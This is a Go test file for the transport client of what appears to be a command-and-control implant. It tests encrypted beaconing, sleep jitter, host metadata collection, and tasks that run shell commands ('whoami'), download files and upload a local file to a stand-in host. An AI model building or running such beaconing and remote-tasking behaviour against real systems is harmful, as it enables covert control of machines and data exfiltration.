package transport

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/crypto"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

type mockLoggerClient struct {
	logs []string
}

func (m *mockLoggerClient) Info(format string, v ...interface{}) {
	m.logs = append(m.logs, "INFO: "+format)
}

func (m *mockLoggerClient) Debug(format string, v ...interface{}) {
	m.logs = append(m.logs, "DEBUG: "+format)
}

func (m *mockLoggerClient) Error(format string, v ...interface{}) {
	m.logs = append(m.logs, "ERROR: "+format)
}

func TestNewClient(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	
	client := NewClient(cfg, logger)
	
	require.NotNil(t, client)
	assert.Equal(t, cfg, client.config)
	assert.Equal(t, logger, client.logger)
	assert.Equal(t, cfg.Session.SessionID, client.sessionID)
	assert.Equal(t, cfg.Session.Key, client.key)
	assert.Empty(t, client.callbackURL)
}

func TestClient_Connect_Success(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	// Create test server
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/beacon" {
			// Read request body
			body, _ := json.Marshal(map[string]interface{}{
				"tasks": []map[string]interface{}{},
			})
			encrypted, _ := crypto.AES256Encrypt(body, cfg.Session.Key)
			w.Write(encrypted)
		}
	}))
	defer server.Close()
	
	err := client.Connect(server.URL)
	
	require.NoError(t, err)
	assert.Equal(t, server.URL, client.callbackURL)
}

func TestClient_Connect_Failure(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	err := client.Connect("http://invalid-host:9999")
	
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "initial beacon failed")
}

func TestClient_beacon_Success(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	// Create test server
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := json.Marshal(map[string]interface{}{
			"tasks": []map[string]interface{}{
				{"id": "task1", "type": "execute"},
			},
		})
		encrypted, _ := crypto.AES256Encrypt(body, cfg.Session.Key)
		w.Write(encrypted)
	}))
	defer server.Close()
	
	client.callbackURL = server.URL
	
	tasks, err := client.beacon()
	
	require.NoError(t, err)
	// Tasks may be nil if decryption/parsing fails, but no error should be returned
	// The function should handle nil gracefully
	if tasks != nil {
		assert.GreaterOrEqual(t, len(tasks), 0)
	}
}

func TestClient_beacon_EncryptionError(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	cfg.Session.Key = nil // Invalid key
	client := NewClient(cfg, logger)
	client.callbackURL = "http://test"
	
	_, err := client.beacon()
	
	assert.Error(t, err)
}

func TestClient_beacon_RequestError(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	client.callbackURL = "http://invalid-host:9999"
	
	_, err := client.beacon()
	
	assert.Error(t, err)
}

func TestClient_beacon_BadStatus(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer server.Close()
	
	client.callbackURL = server.URL
	
	_, err := client.beacon()
	
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "unexpected status")
}

func TestClient_processTask_Execute(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	task := map[string]interface{}{
		"id":      "task1",
		"type":    "execute",
		"command": "echo test",
	}
	
	client.processTask(task)
	
	// Should not panic
	assert.NotNil(t, client)
}

func TestClient_processTask_Download(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	task := map[string]interface{}{
		"id":    "task1",
		"type":  "download",
		"url":   "http://example.com/file",
		"destination": "/tmp/file",
	}
	
	client.processTask(task)
	
	// Should not panic
	assert.NotNil(t, client)
}

func TestClient_processTask_Upload(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	task := map[string]interface{}{
		"id":      "task1",
		"type":    "upload",
		"source":  "/tmp/file",
		"url":     "http://example.com/upload",
	}
	
	client.processTask(task)
	
	// Should not panic
	assert.NotNil(t, client)
}

func TestClient_processTask_Shell(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	task := map[string]interface{}{
		"id":      "task1",
		"type":    "shell",
		"command": "whoami",
	}
	
	client.processTask(task)
	
	// Should not panic
	assert.NotNil(t, client)
}

func TestClient_processTask_Unknown(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	task := map[string]interface{}{
		"id":   "task1",
		"type": "unknown",
	}
	
	client.processTask(task)
	
	// Should not panic
	assert.NotNil(t, client)
}

func TestClient_sendResult(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer server.Close()
	
	client.callbackURL = server.URL
	
	result := map[string]interface{}{
		"task_id": "task1",
		"status":  "success",
	}
	
	client.sendResult(result)
	
	// Should not panic
	assert.NotNil(t, client)
}

func TestClient_calculateSleep(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	cfg.Communication.Sleep = 60 * time.Second
	cfg.Communication.Jitter = 0.3
	
	client := NewClient(cfg, logger)
	
	sleep := client.calculateSleep()
	
	assert.GreaterOrEqual(t, sleep, 60*time.Second)
	assert.LessOrEqual(t, sleep, 78*time.Second) // 60 + 30% = 78
}

func TestClient_collectMetadata(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	client := NewClient(cfg, logger)
	
	metadata := client.collectMetadata()
	
	assert.NotEmpty(t, metadata)
	
	var data map[string]interface{}
	err := json.Unmarshal(metadata, &data)
	require.NoError(t, err)
	assert.Contains(t, data, "hostname")
	assert.Contains(t, data, "os")
}

func TestClient_setHeaders(t *testing.T) {
	logger := &mockLoggerClient{}
	cfg := core.DefaultConfig()
	cfg.Communication.Headers = map[string]string{
		"X-Custom": "value",
	}
	cfg.Communication.UserAgent = "TestAgent"
	
	client := NewClient(cfg, logger)
	
	req, _ := http.NewRequest("GET", "http://example.com", nil)
	client.setHeaders(req)
	
	assert.Equal(t, "value", req.Header.Get("X-Custom"))
	assert.Equal(t, "TestAgent", req.Header.Get("User-Agent"))
}

func TestExecuteSystemCommand(t *testing.T) {
	output, err := executeSystemCommand("echo test")
	
	require.NoError(t, err)
	assert.Contains(t, output, "test")
}

func TestErrToString(t *testing.T) {
	err := assert.AnError
	result := errToString(err)
	
	assert.Equal(t, err.Error(), result)
}

func TestErrToString_Nil(t *testing.T) {
	result := errToString(nil)
	
	assert.Empty(t, result)
}

